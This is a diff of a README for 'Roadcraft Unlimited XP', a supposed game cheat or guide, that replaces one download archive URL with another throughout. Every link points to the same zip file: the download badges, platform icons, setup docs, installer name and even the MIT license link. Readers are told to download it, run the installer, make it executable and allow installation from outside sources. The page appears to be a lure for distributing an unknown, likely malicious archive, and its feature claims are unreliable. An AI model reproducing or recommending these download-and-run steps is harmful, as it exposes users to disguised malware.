@@ -1,6 +1,6 @@
 # Roadcraft Unlimited XP 🛣️
 
-[![Download](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip%20Unlimited%20XP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip%20Unlimited%20XP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip)
 
 ---
 
@@ -14,11 +14,11 @@ This documentation takes you on an immersive journey—starting from installatio
 
 | Operating System&nbsp; | Supported Version&nbsp; | Installation Type&nbsp; | Status&nbsp; |
 |:-----------------------|:-----------------------:|:-----------------------:|:------------:|
-| ![Windows](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip) | 10, 11 | Native / Installer | ✅ Yes |
-| ![macOS](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip) | 12+ (Monterey & newer) | Universal App | ✅ Yes |
-| ![Linux](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip) | Ubuntu 22.04+, Fedora 38+ | Flatpak / AppImage | ✅ Yes |
-| ![Android](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip) | 10.0+ | APK | 🟨 Preview Beta |
-| ![iOS](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip) | 15.0+ | TestFlight | 🟨 Preview Beta |
+| ![Windows](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip) | 10, 11 | Native / Installer | ✅ Yes |
+| ![macOS](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip) | 12+ (Monterey & newer) | Universal App | ✅ Yes |
+| ![Linux](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip) | Ubuntu 22.04+, Fedora 38+ | Flatpak / AppImage | ✅ Yes |
+| ![Android](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip) | 10.0+ | APK | 🟨 Preview Beta |
+| ![iOS](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip) | 15.0+ | TestFlight | 🟨 Preview Beta |
 
 ---
 
@@ -64,7 +64,7 @@ Popular search queries for this repository include:
 - **OpenAI API**: Dynamic road event generation, natural language crew commands, and predictive weather simulations.
 - **Claude API**: Deep conversational AI for coaching, real-time tutorials, and even traffic negotiation—making each session both a challenge and a learning journey.
 
-Consult the `https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip` for API key setup and expansion packs.
+Consult the `https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip` for API key setup and expansion packs.
 
 ---
 
@@ -85,27 +85,27 @@ Consult the `https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-gu
 
 ### 1. Download the Latest Release
 
-[![Download](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip%20Unlimited%20XP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip%20Unlimited%20XP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip)
 
-Choose your favorite OS above and initiate your journey by downloading from: https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip
+Choose your favorite OS above and initiate your journey by downloading from: https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip
 
 ### 2. Follow Your Platform Guide
 
 - **Windows & macOS**:  
-  1. Extract the archive from https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip  
-  2. Run the installer (`https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip` for Windows, `.pkg` for macOS).  
+  1. Extract the archive from https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip  
+  2. Run the installer (`https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip` for Windows, `.pkg` for macOS).  
   3. Proceed with the on-screen wizard.
 
 - **Linux**:  
-  1. Download the `.AppImage` or Flatpak file from https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip  
+  1. Download the `.AppImage` or Flatpak file from https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip  
   2. Make it executable: `chmod +x [FILE]`  
   3. Run and follow the prompts on screen.
 
 - **Android / iOS**:  
-  1. Download from the provided https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip (APK for Android, TestFlight for iOS).  
+  1. Download from the provided https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip (APK for Android, TestFlight for iOS).  
   2. Allow installation from trusted sources (beta).
 
-Need visual step-by-steps? Consult our `https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip` for screenshots and troubleshooting.
+Need visual step-by-steps? Consult our `https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip` for screenshots and troubleshooting.
 
 ---
 
@@ -125,15 +125,15 @@ Enjoy responsibly—drive safely IRL!
 
 This project is licensed under the MIT License—redistribution, modification, and commercial use are warmly welcomed, provided you honor the spirit and letter of the license.
 
-[![License: MIT](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip)
+[![License: MIT](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip)
 
-View the full license text here: [MIT License](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip)
+View the full license text here: [MIT License](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip)
 
 Copyright © 2025
 
 ---
 
-[![Download](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip%20Unlimited%20XP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/roadcraft-xp-unlimited-guide-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip%20Unlimited%20XP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lum11ne/roadcraft-xp-unlimited-guide/branch/crispine/unlimited_guide_roadcraft_xp_v2.7-alpha.4.zip)
 
 ---
 
